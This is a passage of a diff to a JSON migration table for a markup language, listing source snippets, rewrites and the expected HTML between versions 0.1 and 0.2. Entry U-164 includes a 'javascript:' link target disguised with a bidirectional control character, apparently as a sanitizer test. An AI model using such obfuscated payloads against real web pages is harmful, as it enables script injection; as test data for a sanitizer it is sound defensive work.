+      "from": "- item\n\n second paragraph\n",
+      "to": "- item\n\nsecond paragraph\n",
+      "meaning02": "<ul>\n  <li>item\n    <p>second paragraph</p>\n  </li>\n</ul> A comment-only line before or after the blank line changes nothing: `- a`, ` %% c`, a blank line, ` b` keeps `b` in the item too (C2-B-137), where 0.1 closed the list; the same rewrite to column 0 keeps the 0.1 HTML.",
+      "toolEntry": "U-109",
+      "silent": true
+    },
+    {
+      "id": "U-110",
+      "kind": "escape",
+      "group": "new inline shapes",
+      "from": "# My Heading\n\nSee [My Heading][] and [the text][My Heading].\n",
+      "to": "# My Heading\n\nSee [My Heading][] and \\[the text][My Heading].\n",
+      "meaning02": "<section id=\"My-Heading\">\n  <h1>My Heading</h1>\n  <p>See <a href=\"#My-Heading\">My Heading</a> and <a href=\"#My-Heading\">the text</a>.</p>\n</section>",
+      "toolEntry": "U-110",
+      "silent": true
+    },
+    {
+      "id": "U-111",
+      "kind": "escape",
+      "group": "new inline shapes",
+      "from": "See [the text][a long\nlabel] here.\n\n[a long label]: /u\n",
+      "to": "See \\[the text]\\[a long\nlabel] here.\n\n[a long label]: /u\n",
+      "meaning02": "<p>See <a href=\"/u\">the text</a> here.</p>",
+      "toolEntry": "U-111",
+      "silent": true
+    },
+    {
+      "id": "U-112",
+      "kind": "escape",
+      "group": "new inline shapes",
+      "from": "See [x][^n].\n\n[^n]: Note.\n",
+      "to": "See [x]\\[^n].\n\n[^n]: Note.\n",
+      "meaning02": "<p>See [x]<a id=\"fnref1\" href=\"#fn1\" role=\"doc-noteref\"><sup>1</sup></a>.</p>\n<section role=\"doc-endnotes\" aria-label=\"Footnotes\">\n  <hr>\n  <ol>\n    <li id=\"fn1\">\n      <p>Note.<a href=\"#fnref1\" role=\"doc-backlink\" aria-label=\"Back to reference\">↩</a></p>\n    </li>\n  </ol>\n</section>",
+      "toolEntry": "U-112",
+      "silent": true
+    },
+    {
+      "id": "U-113",
+      "kind": "escape",
+      "group": "new inline shapes",
+      "from": "See [*b* and /i/][nope] and [`c`][].\n",
+      "to": "See [\\*b\\* and \\/i\\/][nope] and [\\`c\\`][].\n",
+      "meaning02": "<p>See [<strong>b</strong> and <em>i</em>][nope] and [<code>c</code>][].</p>",
+      "toolEntry": "U-113",
+      "silent": true
+    },
+    {
+      "id": "U-114",
+      "kind": "none",
+      "group": "new inline shapes",
+      "from": ". first\n. second\n",
+      "to": ". first\n. second\n",
+      "meaning02": "<ol>\n  <li>first</li>\n  <li>second</li>\n</ol>",
+      "toolEntry": "U-114",
+      "silent": false
+    },
+    {
+      "id": "U-115",
+      "kind": "escape",
+      "group": "new inline shapes",
+      "from": "a{--}b and --flag\n",
+      "to": "a--b and -\\-flag\n",
+      "meaning02": "<p>a{–}b and –flag</p>",
+      "toolEntry": "U-115",
+      "silent": true
+    },
+    {
+      "id": "U-116",
+      "kind": "rewrite",
+      "group": "later rulings",
+      "from": "~~~js\nx\n~~~\n",
+      "to": "```js\nx\n```\n",
+      "meaning02": "<p>~~~js\nx\n~~~</p>",
+      "toolEntry": "U-116",
+      "silent": true
+    },
+    {
+      "id": "U-117",
+      "kind": "rewrite",
+      "group": "later rulings",
+      "from": "- [ ] a\n- b\n",
+      "to": "- [ ] a\n\n\n\n- b\n",
+      "meaning02": "<ul class=\"task-list\">\n  <li class=\"task\" style=\"list-style: none\"><input type=\"checkbox\" disabled aria-label=\"a\"> a</li>\n  <li>b</li>\n</ul>",
+      "toolEntry": "U-117",
+      "silent": true
+    },
+    {
+      "id": "U-118",
+      "kind": "none",
+      "group": "later rulings",
+      "from": "II. Background\n",
+      "to": "II. Background\n",
+      "meaning02": "<p>II. Background</p>",
+      "toolEntry": "U-118",
+      "silent": false
+    },
+    {
+      "id": "U-119",
+      "kind": "none",
+      "group": "later rulings",
+      "from": "  - a\n- b\n",
+      "to": "  - a\n- b\n",
+      "meaning02": "<ul>\n  <li>a</li>\n  <li>b</li>\n</ul>",
+      "toolEntry": "U-119",
+      "silent": false
+    },
+    {
+      "id": "U-120",
+      "kind": "escape",
+      "group": "later rulings",
+      "from": "1. [ ] x\n",
+      "to": "1. \\[ ] x\n",
+      "meaning02": "<ol class=\"task-list\">\n  <li class=\"task\"><input type=\"checkbox\" disabled aria-label=\"x\"> x</li>\n</ol>",
+      "toolEntry": "U-120",
+      "silent": true
+    },
+    {
+      "id": "U-121",
+      "kind": "escape",
+      "group": "later rulings",
+      "from": "[text]\n\n[text]: /u\n",
+      "to": "\\[text]\n\n[text]: /u\n",
+      "meaning02": "<p><a href=\"/u\">text</a></p>",
+      "toolEntry": "U-121",
+      "silent": true
+    },
+    {
+      "id": "U-122",
+      "kind": "rewrite",
+      "group": "lists",
+      "from": "- > +",
+      "to": "- >",
+      "meaning02": "<ul>\n  <li>\n    <blockquote><p>+</p></blockquote>\n  </li>\n</ul>",
+      "toolEntry": "U-122",
+      "silent": true
+    },
+    {
+      "id": "U-123",
+      "kind": "rewrite",
+      "group": "lists",
+      "from": ":: t\n: +",
+      "to": ":: t\n: {% %}",
+      "meaning02": "<dl>\n  <dt>t</dt>\n  <dd>+</dd>\n</dl> When a standalone plus moved the next paragraph outside the description in 0.1, a blank line and column zero replace that marker.",
+      "toolEntry": "U-123",
+      "silent": true
+    },
+    {
+      "id": "U-124",
+      "kind": "rewrite",
+      "group": "references and footnotes",
+      "from": "a\n[^n]: +",
+      "to": "a\n\n[^n]: +",
+      "meaning02": "<p>a\n[^n]: +</p>",
+      "toolEntry": "U-124",
+      "silent": true
+    },
+    {
+      "id": "U-125",
+      "kind": "rewrite",
+      "group": "fences, quotes, comments",
+      "from": "> +\n>",
+      "to": ">\n>",
+      "meaning02": "C2-B-059 removes the 0.1 plus; an empty quote line can keep a following code-span paragraph separate. A backtick run 0.1 read to the end of its content is text in 0.2 (C2-I-017).",
+      "toolEntry": "U-125",
+      "silent": true
+    },
+    {
+      "id": "U-126",
+      "kind": "rewrite",
+      "group": "paragraphs and blocks",
+      "from": "y\n>",
+      "to": "y\n\n>",
+      "meaning02": "<p>y\n&gt;</p>",
+      "toolEntry": "U-126",
+      "silent": true
+    },
+    {
+      "id": "U-127",
+      "kind": "rewrite",
+      "group": "fences, quotes, comments",
+      "from": "- ```\n\n+",
+      "to": "- ```\n\n  ```",
+      "meaning02": "<ul>\n  <li>\n    <pre><code></code></pre>\n  </li>\n</ul>\n<p>+</p>",
+      "toolEntry": "U-127",
+      "silent": true
+    },
+    {
+      "id": "U-128",
+      "kind": "rewrite",
+      "group": "lists",
+      "from": " :: t\n: x",
+      "to": ":: t\n: x",
+      "meaning02": "<dl>\n  <dt>t</dt>\n</dl>\n<p>: x</p>",
+      "toolEntry": "U-128",
+      "silent": true
+    },
+    {
+      "id": "U-129",
+      "kind": "rewrite",
+      "group": "fences, quotes, comments",
+      "from": "%%%\n%%%%\ny",
+      "to": "%%%%%\n%%%%\ny",
+      "meaning02": "<p>y</p> The fence and its following line can also move across a list or description ownership boundary; indent the fence or move the follower to column zero to retain 0.1 HTML.",
+      "toolEntry": "U-129",
+      "silent": true
+    },
+    {
+      "id": "U-130",
+      "kind": "report",
+      "group": "fences, quotes, comments",
+      "from": "::: |\n\tx",
+      "to": "",
+      "meaning02": "<div class=\"line-block\">\n  <p>&nbsp;&nbsp;&nbsp;&nbsp;x</p>\n</div>",
+      "toolEntry": "U-130",
+      "silent": true
+    },
+    {
+      "id": "U-131",
+      "kind": "report",
+      "group": "definitions",
+      "from": "* [d]:",
+      "to": "",
+      "meaning02": "<ul>\n  <li>[d]:</li>\n</ul>",
+      "toolEntry": "U-131",
+      "silent": true
+    },
+    {
+      "id": "U-132",
+      "kind": "report",
+      "group": "definitions",
+      "from": "[r]:",
+      "to": "",
+      "meaning02": "<p>[r]:</p>",
+      "toolEntry": "U-132",
+      "silent": true
+    },
+    {
+      "id": "U-133",
+      "kind": "report",
+      "group": "lists",
+      "from": "- [ ] +",
+      "to": "",
+      "meaning02": "<ul class=\"task-list\">\n  <li class=\"task\" style=\"list-style: none\"><input type=\"checkbox\" disabled aria-label=\"+\"> +</li>\n</ul> A following heading can also extend the checkbox aria label to include heading text.",
+      "toolEntry": "U-133",
+      "silent": true
+    },
+    {
+      "id": "U-134",
+      "kind": "report",
+      "group": "definitions",
+      "from": "> [f]:",
+      "to": "",
+      "meaning02": "<blockquote><p>[f]:</p></blockquote>",
+      "toolEntry": "U-134",
+      "silent": true
+    },
+    {
+      "id": "U-135",
+      "kind": "rewrite",
+      "group": "fences, quotes, comments",
+      "from": "```\n\n",
+      "to": "```\n\n```\n",
+      "meaning02": "<pre><code></code></pre>",
+      "toolEntry": "U-135",
+      "silent": true
+    },
+    {
+      "id": "U-136",
+      "kind": "escape",
+      "group": "inline emphasis and typography",
+      "from": "{%\n%}x",
+      "to": "\\{%\n%}x",
+      "meaning02": "<p>x</p>",
+      "toolEntry": "U-136",
+      "silent": true
+    },
+    {
+      "id": "U-137",
+      "kind": "rewrite",
+      "group": "attributes",
+      "from": "- {k}",
+      "to": "- {% %}",
+      "meaning02": "<ul>\n  <li>{k}</li>\n</ul> A blank line before the following block is also needed when 0.1 ended the empty owner there. An empty `{}` directly after the marker can be removed to keep the 0.1 list item.",
+      "toolEntry": "U-137",
+      "silent": true
+    },
+    {
+      "id": "U-138",
+      "kind": "rewrite",
+      "group": "captions",
+      "from": ">\n^ p",
+      "to": ">\n\n^ p",
+      "meaning02": "<figure>\n  <blockquote>\n\n  </blockquote>\n  <figcaption>p</figcaption>\n</figure>",
+      "toolEntry": "U-138",
+      "silent": true
+    },
+    {
+      "id": "U-139",
+      "kind": "escape",
+      "group": "references and footnotes",
+      "from": "x^[]",
+      "to": "x\\^[]",
+      "meaning02": "<p>x<a id=\"fnref1\" href=\"#fn1\" role=\"doc-noteref\"><sup>1</sup></a></p>\n<section role=\"doc-endnotes\" aria-label=\"Footnotes\">\n  <hr>\n  <ol>\n    <li id=\"fn1\">\n      <p><a href=\"#fnref1\" role=\"doc-backlink\" aria-label=\"Back to reference\">↩</a></p>\n    </li>\n  </ol>\n</section>",
+      "toolEntry": "U-139",
+      "silent": true
+    },
+    {
+      "id": "U-140",
+      "kind": "report",
+      "group": "tables",
+      "from": "|\t|",
+      "to": "",
+      "meaning02": "<table>\n  <tbody>\n    <tr><td></td></tr>\n  </tbody>\n</table>",
+      "toolEntry": "U-140",
+      "silent": true
+    },
+    {
+      "id": "U-141",
+      "kind": "rewrite",
+      "group": "attributes",
+      "from": "> {k}\nt",
+      "to": ">\nt",
+      "meaning02": "C2-B-090, C2-B-095, and C2-B-101 read an unremoved single-line or multiline attribute inside the quote.",
+      "toolEntry": "U-141",
+      "silent": true
+    },
+    {
+      "id": "U-142",
+      "kind": "rewrite",
+      "group": "attributes",
+      "from": ":: t\n: {empty}\n",
+      "to": ":: t\n: {% %}\n",
+      "meaning02": "<dl>\n  <dt>t</dt>\n  <dd>{empty}</dd>\n</dl> A blank line before the following block is also needed when 0.1 ended the empty owner there.",
+      "toolEntry": "U-142",
+      "silent": true
+    },
+    {
+      "id": "U-143",
+      "kind": "report",
+      "group": "measured rendering changes",
+      "from": "/{/",
+      "to": "",
+      "meaning02": "<p>/{/</p>",
+      "toolEntry": "U-143",
+      "silent": true
+    },
+    {
+      "id": "U-145",
+      "kind": "report",
+      "group": "measured rendering changes",
+      "from": "/*//",
+      "to": "",
+      "meaning02": "<p>/*//</p>",
+      "toolEntry": "U-145",
+      "silent": true
+    },
+    {
+      "id": "U-147",
+      "kind": "report",
+      "group": "measured rendering changes",
+      "from": "||\n+||",
+      "to": "",
+      "meaning02": "<table>\n  <tbody>\n    <tr><td></td><td></td></tr>\n  </tbody>\n</table>",
+      "toolEntry": "U-147",
+      "silent": true
+    },
+    {
+      "id": "U-148",
+      "kind": "report",
+      "group": "measured rendering changes",
+      "from": "# \t%%h",
+      "to": "",
+      "meaning02": "<section id=\"s\">\n  <h1></h1>\n</section>",
+      "toolEntry": "U-148",
+      "silent": true
+    },
+    {
+      "id": "U-150",
+      "kind": "report",
+      "group": "measured rendering changes",
+      "from": "{widths=5}\n|||",
+      "to": "",
+      "meaning02": "<table>\n  <colgroup>\n    <col style=\"width: 5%;\">\n    <col>\n  </colgroup>\n  <tbody>\n    <tr><td></td><td></td></tr>\n  </tbody>\n</table>",
+      "toolEntry": "U-150",
+      "silent": true
+    },
+    {
+      "id": "U-151",
+      "kind": "report",
+      "group": "measured rendering changes",
+      "from": "_{_",
+      "to": "",
+      "meaning02": "<p>_{_</p>",
+      "toolEntry": "U-151",
+      "silent": true
+    },
+    {
+      "id": "U-152",
+      "kind": "report",
+      "group": "measured rendering changes",
+      "from": "||\t<|",
+      "to": "",
+      "meaning02": "<table>\n  <tbody>\n    <tr><td colspan=\"2\"></td></tr>\n  </tbody>\n</table>",
+      "toolEntry": "U-152",
+      "silent": true
+    },
+    {
+      "id": "U-153",
+      "kind": "report",
+      "group": "measured rendering changes",
+      "from": "- \te",
+      "to": "",
+      "meaning02": "<ul>\n  <li>e</li>\n</ul>",
+      "toolEntry": "U-153",
+      "silent": true
+    },
+    {
+      "id": "U-154",
+      "kind": "report",
+      "group": "measured rendering changes",
+      "from": "[see this[^1] page](/u)\n\n[^1]: n\n",
+      "to": "",
+      "meaning02": "<p><a href=\"/u\">see this page</a><a id=\"fnref1\" href=\"#fn1\" role=\"doc-noteref\"><sup>1</sup></a></p> C2-H-088: a note mark in link text is written after the closing anchor of the outermost link; 0.1 wrote it inside the anchor.",
+      "toolEntry": "U-154",
+      "silent": true
+    },
+    {
+      "id": "U-155",
+      "kind": "report",
+      "group": "measured rendering changes",
+      "from": "a\t%%",
+      "to": "",
+      "meaning02": "<p>a</p>",
+      "toolEntry": "U-155",
+      "silent": true
+    },
+    {
+      "id": "U-157",
+      "kind": "report",
+      "group": "measured rendering changes",
+      "from": "```s \"\"u",
+      "to": "",
+      "meaning02": "<pre title=\"\"><code class=\"language-s\"></code></pre>",
+      "toolEntry": "U-157",
+      "silent": true
+    },
+    {
+      "id": "U-158",
+      "kind": "report",
+      "group": "measured rendering changes",
+      "from": "[\\[][]",
+      "to": "",
+      "meaning02": "<p>[[][]</p> C2-H-085 renders the children of an unresolved reference, so an escape in its text is gone; 0.1 wrote the reference as typed.",
+      "toolEntry": "U-158",
+      "silent": true
+    },
+    {
+      "id": "U-159",
+      "kind": "report",
+      "group": "measured rendering changes",
+      "from": "- [x] a  h",
+      "to": "",
+      "meaning02": "<ul class=\"task-list\">\n  <li data-task-state=\"x\" class=\"task\" style=\"list-style: none\"><input type=\"checkbox\" checked disabled aria-label=\"a  h\"> a  h</li>\n</ul>",
+      "toolEntry": "U-159",
+      "silent": true
+    },
+    {
+      "id": "U-160",
+      "kind": "report",
+      "group": "measured rendering changes",
+      "from": "x[^f\ng]\n[^f g]: n",
+      "to": "",
+      "meaning02": "<p>x[^f g]\n[^f g]: n</p>",
+      "toolEntry": "U-160",
+      "silent": true
+    },
+    {
+      "id": "U-161",
+      "kind": "report",
+      "group": "measured rendering changes",
+      "from": "![][a\nb]",
+      "to": "",
+      "meaning02": "<p>![][a b]</p>",
+      "toolEntry": "U-161",
+      "silent": true
+    },
+    {
+      "id": "U-162",
+      "kind": "rewrite",
+      "group": "measured rendering changes",
+      "from": "|?v |",
+      "to": "|{?v} |",
+      "meaning02": "<table>\n  <tbody>\n    <tr><td>?v</td></tr>\n  </tbody>\n</table>",
+      "toolEntry": "U-162",
+      "silent": true
+    },
+    {
+      "id": "U-163",
+      "kind": "report",
+      "group": "measured rendering changes",
+      "from": "-  [ ] q",
+      "to": "",
+      "meaning02": "<ul>\n  <li>[ ] q</li>\n</ul>",
+      "toolEntry": "U-163",
+      "silent": true
+    },
+    {
+      "id": "U-164",
+      "kind": "report",
+      "group": "measured rendering changes",
+      "from": "[](‮javascript:)",
+      "to": "",
+      "meaning02": "<p><a href=\"\"></a></p> The same holds for an authored attribute that is no URL sink: `*x*{k=\"‮javascript:x\"}` writes `<strong k=\"\">`, where 0.1 wrote the value, since C2-H-161 removes the characters of `probe_removes` before it tests the scheme of any authored value. Without the control both engines write the value empty. No spelling keeps the 0.1 HTML.",
+      "toolEntry": "U-164",
+      "silent": true
+    },
+    {
+      "id": "U-165",
+      "kind": "report",
+      "group": "measured rendering changes",
+      "from": "|{#x}|",
+      "to": "",
+      "meaning02": "<table>\n  <tbody>\n    <tr><td id=\"x\"></td></tr>\n  </tbody>\n</table>",
+      "toolEntry": "U-165",
+      "silent": true
+    },
+    {
+      "id": "U-166",
+      "kind": "report",
+      "group": "measured rendering changes",
+      "from": "[][@a]",
+      "to": "",
+      "meaning02": "<p>[][<span class=\"mention\"><strong>@a</strong></span>]</p>",
+      "toolEntry": "U-166",
+      "silent": true
+    },
+    {
+      "id": "U-167",
+      "kind": "report",
+      "group": "measured rendering changes",
+      "from": "|=|\n|:-|",
+      "to": "",
+      "meaning02": "<table>\n  <thead>\n    <tr><th scope=\"col\"></th></tr>\n  </thead>\n  <tbody>\n    <tr><td>:-</td></tr>\n  </tbody>\n</table>",
+      "toolEntry": "U-167",
+      "silent": true
+    },
+    {
+      "id": "U-168",
+      "kind": "report",
+      "group": "measured rendering changes",
+      "from": "|=||",
+      "to": "",
+      "meaning02": "<table>\n  <tbody>\n    <tr><th scope=\"row\"></th><td></td></tr>\n  </tbody>\n</table>",
+      "toolEntry": "U-168",
+      "silent": true
+    },
+    {
+      "id": "U-169",
+      "kind": "report",
+      "group": "measured rendering changes",
+      "from": "-{k} {#h}",
+      "to": "",
+      "meaning02": "<ul>\n  <li k=\"\">{#h}</li>\n</ul>",
+      "toolEntry": "U-169",
+      "silent": true
+    },
+    {
+      "id": "U-170",
+      "kind": "report",
+      "group": "measured rendering changes",
+      "from": "@a-",
+      "to": "",
+      "meaning02": "<p><span class=\"mention\"><strong>@a</strong></span>-</p> C2-I-092 ends a mention or tag name before a trailing hyphen, which is text behind it; 0.1 kept the hyphen in the name. A tag does the same: `#x-` writes `<p><span class=\"tag\"><strong>#x</strong></span>-</p>`, where 0.1 wrote `<strong>#x-</strong>`. No 0.2 name ends with a hyphen, so no spelling keeps the 0.1 HTML.",
+      "toolEntry": "U-170",
+      "silent": true
+    },
+    {
+      "id": "U-171",
+      "kind": "report",
+      "group": "measured rendering changes",
+      "from": "![\n]()",
+      "to": "",
+      "meaning02": "<p><img src=\"\" alt=\"\n\"></p>",
+      "toolEntry": "U-171",
+      "silent": true
+    },
+    {
+      "id": "U-172",
+      "kind": "report",
+      "group": "measured rendering changes",
+      "from": "{loose}\n:: T",
+      "to": "",
+      "meaning02": "<dl loose=\"\">\n  <dt>T</dt>\n</dl>",
+      "toolEntry": "U-172",
+      "silent": true
+    },
+    {
+      "id": "U-174",
+      "kind": "report",
+      "group": "measured rendering changes",
+      "from": "# \tx",
+      "to": "",
+      "meaning02": "<section id=\"x\">\n  <h1>x</h1>\n</section>",
+      "toolEntry": "U-174",
+      "silent": true
+    },
+    {
+      "id": "U-175",
+      "kind": "report",
+      "group": "measured rendering changes",
+      "from": "[]( )",
+      "to": "",
+      "meaning02": "<p>[]( )</p>",
+      "toolEntry": "U-175",
+      "silent": true
+    },
+    {
+      "id": "U-176",
+      "kind": "report",
+      "group": "measured rendering changes",
+      "from": "# T\rb",
+      "to": "",
+      "meaning02": "<section id=\"T-b\">\n  <h1>T\rb</h1>\n</section>",
+      "toolEntry": "U-176",
+      "silent": true
+    },
+    {
+      "id": "U-177",
+      "kind": "rewrite",
+      "group": "measured ownership and inline rewrites",
+      "from": "[^a]: o\n+\n e\n\ns",
+      "to": "[^a]: o\n\n{% %}\n e\n\ns",
+      "meaning02": "<p>s</p>",
+      "toolEntry": "U-177",
+      "silent": true
+    },
+    {
+      "id": "U-178",
+      "kind": "rewrite",
+      "group": "measured ownership and inline rewrites",
+      "from": ":::[+]",
+      "to": "::: [+]",
+      "meaning02": "<p>:::[+]</p>",
+      "toolEntry": "U-178",
+      "silent": true
+    },
+    {
+      "id": "U-179",
+      "kind": "rewrite",
+      "group": "measured ownership and inline rewrites",
+      "from": ":: t\n: ```\n y",
+      "to": ":: t\n: ```\ny",
+      "meaning02": "<dl>\n  <dt>t</dt>\n  <dd>\n    <pre><code>y\n</code></pre>\n  </dd>\n</dl>",
+      "toolEntry": "U-179",
+      "silent": true
+    },
+    {
+      "id": "U-180",
+      "kind": "rewrite",
+      "group": "measured ownership and inline rewrites",
+      "from": ":: t\n : b",
+      "to": " :: t\n : b",
+      "meaning02": "<dl>\n  <dt>t\n: b</dt>\n</dl>",
+      "toolEntry": "U-180",
+      "silent": true
+    },
+    {
+      "id": "U-181",
+      "kind": "escape",
+      "group": "measured ownership and inline rewrites",
+      "from": "\\</#x>",
+      "to": "\\</\\#x>",
+      "meaning02": "<p>&lt;/<span class=\"tag\"><strong>#x</strong></span>&gt;</p>",
+      "toolEntry": "U-181",
+      "silent": true
+    },
+    {
+      "id": "U-182",
+      "kind": "escape",
+      "group": "measured ownership and inline rewrites",
+      "from": "[{^]^}",
+      "to": "[\\{^]^}",
+      "meaning02": "<p>[<sup>]</sup></p>",
+      "toolEntry": "U-182",
+      "silent": true
+    },
+    {
+      "id": "U-183",
+      "kind": "escape",
+      "group": "measured ownership and inline rewrites",
+      "from": "![a][nope]\n^ cap",
+      "to": "\\![a][nope]\n^ cap",
+      "meaning02": "<figure>\n  <p>![a][nope]</p>\n  <figcaption>cap</figcaption>\n</figure>",
+      "toolEntry": "U-183",
+      "silent": true
+    },
+    {
+      "id": "U-184",
+      "kind": "report",
+      "group": "measured ownership and inline rewrites",
+      "from": "- {{ e }}\n  b\n",
+      "to": "- \\{{ e }}\n  b\n",
+      "meaning02": "<ul>\n  <li>{{ e }}\n    <p>b</p>\n  </li>\n</ul> An include directive alone on its line is a block of one line (C2-B-156), so the line below it starts a paragraph of its own, in an item, in a quote and at document level, and two directives on adjacent lines are two includes, `<p>{{ a.crv }}</p>` and `<p>{{ b.crv }}</p>` with no resolver. 0.1 read the directive and the line below as one paragraph, `<li>{{ e }}\nb</li>`, `<p>{{ a.crv }}\n{{ b.crv }}</p>`, and with includes expanded joined the included text and the next line in that paragraph. An escaped opening brace keeps the 0.1 HTML without a resolver but stops the include from being expanded (C2-N-002); no 0.2 source joins an expanded include with the next line.",
+      "toolEntry": "U-184",
+      "silent": true
+    },
+    {
+      "id": "U-186",
+      "kind": "rewrite",
+      "group": "measured ownership and inline rewrites",
+      "from": ":::[]",
+      "to": "::: []",
+      "meaning02": "<p>:::[]</p>",
+      "toolEntry": "U-186",
+      "silent": true
+    },
+    {
+      "id": "U-187",
+      "kind": "rewrite",
+      "group": "measured ownership and inline rewrites",
+      "from": "[@]: y",
+      "to": " [@]: y",
+      "meaning02": "",
+      "toolEntry": "U-187",
+      "silent": true
+    },
+    {
+      "id": "U-188",
+      "kind": "escape",
+      "group": "measured ownership and inline rewrites",
+      "from": ":+-:",
+      "to": ":\\+-:",
+      "meaning02": "<p>:±:</p>",
+      "toolEntry": "U-188",
+      "silent": true
+    },
+    {
+      "id": "U-189",
+      "kind": "escape",
+      "group": "measured ownership and inline rewrites",
+      "from": "d[^]{}",
+      "to": "d[\\^]{}",
+      "meaning02": "<p>d[^]{}</p>",
+      "toolEntry": "U-189",
+      "silent": true
+    },
+    {
+      "id": "U-190",
+      "kind": "rewrite",
+      "group": "measured ownership and inline rewrites",
+      "from": "x{.k title=\"`\"} y\n",
+      "to": "x{.k title=“`\"} y`\n",
+      "meaning02": "C2-I-104 closes a quote before a hard break as 0.1 did, so that case needs no rewrite. C2-I-017 reads the unclosed backtick as text; the rendered Unicode quote and a closing run keep the 0.1 HTML <p>x{.k title=“<code>\"} y</code></p>.",
+      "toolEntry": "U-190",
+      "silent": true
+    },
+    {
+      "id": "U-192",
+      "kind": "rewrite",
+      "group": "measured ownership and inline rewrites",
+      "from": "[]{:r lang}\n",
+      "to": "[]{lang}\n",
+      "meaning02": "C2-A-037 removes the shorthand so the explicit empty lang key wins. A separate language shorthand before a later lang attribute can likewise be removed when 0.1 selected the later attribute.",
+      "toolEntry": "U-192",
+      "silent": true
+    },
+    {
+      "id": "U-193",
+      "kind": "report",
+      "group": "measured ownership and inline rewrites",
+      "from": ":: \tx\n",
+      "to": ":: \tx\n",
+      "meaning02": "C2-B-069 starts the term at its content column, so the marker tab is dropped and its HTML text changes.",
+      "toolEntry": "U-193",
+      "silent": true
+    },
+    {
+      "id": "U-194",
+      "kind": "report",
+      "group": "measured ownership and inline rewrites",
+      "from": "|\t---|\n",
+      "to": "|\t---|\n",
+      "meaning02": "C2-B-171 trims the cell tab, so its HTML text changes.",
+      "toolEntry": "U-194",
+      "silent": true
+    },
+    {
+      "id": "U-195",
+      "kind": "report",
+      "group": "measured ownership and inline rewrites",
+      "from": ":::[`x`]\nbody\n:::\n",
+      "to": ":::[`x`]\nbody\n:::\n",
+      "meaning02": "C2-B-119 and C2-B-121 read the label in the metadata slot without the 0.1 inline rendering.",
+      "toolEntry": "U-195",
+      "silent": true
+    },
+    {
+      "id": "U-197",
+      "kind": "rewrite",
+      "group": "measured ownership and inline rewrites",
+      "from": "- a\n  {.k}\n# H\n",
+      "to": "- a\n\n# H\n",
+      "meaning02": "C2-B-090, C2-B-095, and C2-B-101 leave the attribute text in the item unless it is removed before the next block. The same boundary can follow a plain paragraph, so a blank line keeps that paragraph outside the item.",
+      "toolEntry": "U-197",
+      "silent": true
+    },
+    {
+      "id": "U-198",
+      "kind": "report",
+      "group": "measured ownership and inline rewrites",
+      "from": "{~a~>~}\n",
+      "to": "{~a~>~}\n",
+      "meaning02": "C2-I-062 has no arrow replacement, and C2-W-116 gives an empty insertion or deletion no spelling.",
+      "toolEntry": "U-198",
+      "silent": true
+    },
+    {
+      "id": "U-199",
+      "kind": "rewrite",
+      "group": "measured ownership and inline rewrites",
+      "from": ":: t\n:  d\n   {.k}\ntail\n",
+      "to": ":: t\n:  d\n\ntail\n",
+      "meaning02": "C2-B-076 and C2-B-078 keep a following indented line in the description body until an explicit boundary; an attribute consumed by 0.1 must be removed when it has no rendered effect. A blank line before an indented following paragraph can also keep that paragraph in the description body, so the paragraph is moved to column zero.",
+      "toolEntry": "U-199",
+      "silent": true
+    },
+    {
+      "id": "U-200",
+      "kind": "rewrite",
+      "group": "measured ownership and inline rewrites",
+      "from": "{~a~>b~}{.k} c\n",
+      "to": "{-a-}{+b+}\\{.k} c\n",
+      "meaning02": "C2-I-062 writes a replacement as adjacent deletion and insertion nodes, and C2-I-043 would attach the following attribute to the insertion unless its brace is escaped.",
+      "toolEntry": "U-200",
+      "silent": true
+    },
+    {
+      "id": "U-204",
+      "kind": "rewrite",
+      "group": "measured continuation and fence rewrites",
+      "from": ":: t\n:  d\n+\n```\na\n\nb\n```\n",
+      "to": ":: t\n:  d\n  ```\n  a\n\n  ```\nb\n```\n",
+      "meaning02": "C2-B-059 and C2-B-113 require the fence to be indented under its owner and explicitly closed before the following paragraph when 0.1 ended ownership at a blank line.",
+      "toolEntry": "U-204",
+      "silent": true
+    },
+    {
+      "id": "U-206",
+      "kind": "report",
+      "group": "measured reference rendering changes",
+      "from": "# *Setup*\n\nSee </#Setup>.\n",
+      "to": "# *Setup*\n\nSee </#Setup>.\n",
+      "meaning02": "C2-H-095 and C2-H-096 render a resolved cross-reference with the heading plain text or caption label and number instead of the 0.1 rich or recursive display.",
+      "toolEntry": "U-206",
+      "silent": true
+    },
+    {
+      "id": "U-207",
+      "kind": "report",
+      "group": "measured inline reference rewrites",
+      "from": "Text[^a]{.c}{#i}.\n",
+      "to": "",
+      "meaning02": "<p>Text[^a]{#i .c}.</p> An unresolved footnote reference writes its glued attribute blocks as one block in the fixed order (C2-I-088, C2-I-085, C2-H-139); 0.1 wrote them as typed, `Text[^a]{.c}{#i}.`. No rewrite is recorded; review.",
+      "toolEntry": "U-207",
+      "silent": true
+    },
+    {
+      "id": "U-209",
+      "kind": "report",
+      "group": "measured container continuation boundaries",
+      "from": "> quoted\n+\n- item\n> more\n",
+      "to": "> quoted\n>\n> - item\n> more\n",
+      "meaning02": "C2-B-059 keeps the following quote line inside the quoted list item after the available continuation rewrite. No preserving rewrite was verified for this source.",
+      "toolEntry": "U-209",
+      "silent": true
+    },
+    {
+      "id": "U-210",
+      "kind": "rewrite",
+      "group": "measured description definition ownership",
+      "from": ":: term\n:  [r]: /u\n\nsee [t][r]\n",
+      "to": "[r]: /u\n\n:: term\n: {% %}\n\nsee [t][r]\n",
+      "meaning02": "C2-B-069, C2-B-076, and C2-B-081 leave an empty description body and resolve the reference after the definition is moved to document scope. The same holds below a term: `:: t` then `  [r]: /u` defines `r` in 0.1, while in 0.2 the line continues the term (C2-B-069) and is term text, `<dt>t\n[r]: /u</dt>`, so `[x][r]` stays text; a blank line and the definition at column 0, `:: t`, a blank line, `[r]: /u`, keep the 0.1 HTML.",
+      "toolEntry": "U-210",
+      "silent": true
+    },
+    {
+      "id": "U-211",
+      "kind": "rewrite",
+      "group": "measured block attribute boundaries",
+      "from": "{.a\n\t.b}\n\nparagraph\n",
+      "to": "{.a .b}\nparagraph\n",
+      "meaning02": "C2-B-090 and C2-B-095 attach the folded single-line attribute to the paragraph after the blank line is removed.",
+      "toolEntry": "U-211",
+      "silent": true
+    },
+    {
+      "id": "U-212",
+      "kind": "escape",
+      "group": "measured quote caption boundaries",
+      "from": "> a\n ^ cap\n",
+      "to": "> a\n \\^ cap\n",
+      "meaning02": "C2-B-147 and C2-B-149 keep the caret as quote text after it is escaped, rather than attaching a figure caption.",
+      "toolEntry": "U-212",
+      "silent": true
+    },
+    {
+      "id": "U-213",
+      "kind": "rewrite",
+      "group": "measured list definition ownership",
+      "from": "See [^a].\n\n- [^a]: note body\n",
